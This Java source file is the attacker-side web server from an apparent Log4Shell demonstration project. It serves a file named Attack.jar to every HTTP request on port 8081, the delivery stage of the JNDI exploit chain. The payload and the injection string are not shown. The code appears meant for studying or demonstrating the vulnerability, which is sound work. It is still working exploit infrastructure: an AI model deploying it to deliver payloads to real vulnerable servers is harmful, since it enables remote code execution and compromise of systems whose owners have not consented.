package de.apwolf.log4shell.attacker;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;

/**
 * This is a simple file hosting webserver - it just returns a Jar on every request
 */
public class AttackerWebServer {

    private static final Logger LOGGER = LogManager.getLogger(AttackerWebServer.class);
    private static final int PORT = 8081;

    // The Jar this service provides - must be stored in the resources/ folder, no subfolder please
    private static final String ATTACK_JAR = "Attack.jar";

    public void start() throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(PORT), 0);
        server.createContext("/", this::handle); // just always return the Jar
        server.start();
        LOGGER.info("Started Attacker HTTP Server on localhost:" + PORT);
    }

    private void handle(HttpExchange t) {
        try {
            LOGGER.info("HTTP call " + t.getRequestMethod() + " " + t.getRequestURI());
            byte[] payload = getBytesFromInputStream(AttackerWebServer.class.getClassLoader().getResourceAsStream(ATTACK_JAR));
            t.getResponseHeaders().add("Content-Disposition", "attachment; filename=" + ATTACK_JAR); // not actually needed but nicer for humans
            t.sendResponseHeaders(200, payload.length);
            OutputStream os = t.getResponseBody();
            os.write(payload);
            os.close();
        } catch (Exception e) {
            LOGGER.error(e);
            throw new IllegalStateException(e);
        }
    }

    /**
     * Utility method to read the bytes without using a 3rd party lib
     */
    private static byte[] getBytesFromInputStream(InputStream inputStream) throws IOException {
        if (inputStream == null) {
            throw new IOException("File " + ATTACK_JAR + " not found!");
        }
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[0xFFFF]; // just use max size, no need for performance optimizing here
        for (int i = inputStream.read(buffer); i != -1; i = inputStream.read(buffer)) {
            outputStream.write(buffer, 0, i);
        }
        return outputStream.toByteArray();
    }

}
